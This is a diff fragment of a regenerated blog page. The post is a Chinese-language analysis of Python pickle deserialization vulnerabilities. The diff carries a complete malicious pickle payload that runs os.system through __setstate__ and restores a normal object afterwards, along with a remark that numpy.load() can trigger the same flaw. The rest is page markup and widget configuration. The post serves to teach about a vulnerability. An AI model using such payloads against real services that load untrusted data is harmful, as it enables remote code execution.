+pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>c<span class="token punctuation">)</span></code></pre>
 
 <p>执行结果如下：</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407100434411.png" alt loading="lazy"></p>
 <p>可见成功执行了命令</p>
 <p>完整payload如下：</p>
-<pre class="language-python" data-language="python"><code class="language-python">b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb0c__main__\nFoo\nq\x00)\x81q\x01&#125;q\x02X\x03\x00\x00\x00valq\x03K\x04sb.&#39;</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b'\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb0c__main__\nFoo\nq\x00)\x81q\x01&#125;q\x02X\x03\x00\x00\x00valq\x03K\x04sb.'</span></code></pre>
 
 <p>恶意代码执行完后将栈弹空，然后压一个正常的<code>student</code>入栈</p>
 <h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>其他模块的load也可以触发pickle反序列化漏洞。例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p>
@@ -363,7 +363,7 @@ pickle.loads(c)</code></pre>
   const valineConfig = {"enable":true,"appId":"D0RsYpx00piDirHr8rmxtml4-gzGzoHsz","appKey":"aCk3nRmmI5uzkoEoVjtToEe8","placeholder":"不留点什么？","avatar":null,"pageSize":10,"visitor":false,"highlight":true,"recordIP":false,"enableQQ":true,"meta":["nick","mail","link"],"el":"#valine-container","lang":"zh-cn"}
   valineConfig.path = "/posts/488d0f65/"
   new Valine(valineConfig)
-}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">湘ICP备2021001321号</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Extrader</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.3</span></div><div class="live_time"><span>本博客已运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">湘ICP备2021001321号</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Extrader</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.4.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>本博客已运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
   setTimeout(blog_live_time, 1000);
   const start = new Date('2020-01-08T00:00:00');
   const now = new Date();
@@ -378,7 +378,7 @@ pickle.loads(c)</code></pre>
   display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
 }
 blog_live_time();
-</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+</script></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
   // Handle and trigger popup window
   document.querySelector(".popup-trigger").addEventListener("click", () => {
     document.querySelector(".popup").classList.add("show");
